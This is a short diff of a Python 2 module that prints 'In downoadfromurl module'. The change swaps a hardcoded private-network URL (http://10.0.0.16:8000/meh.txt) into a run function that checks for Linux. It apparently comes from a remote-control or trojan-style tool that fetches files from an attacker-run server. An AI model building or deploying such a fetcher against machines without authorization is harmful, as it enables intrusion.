@@ -7,7 +7,7 @@ import platform
 
 def run(**args):
     try:
-        url = "http://172.16.153.1:8000/meh.txt"
+        url = "http://10.0.0.16:8000/meh.txt"
         print "[*] In downoadfromurl module."
     
         if platform.system() == "linux" or platform.system() == "linux2":
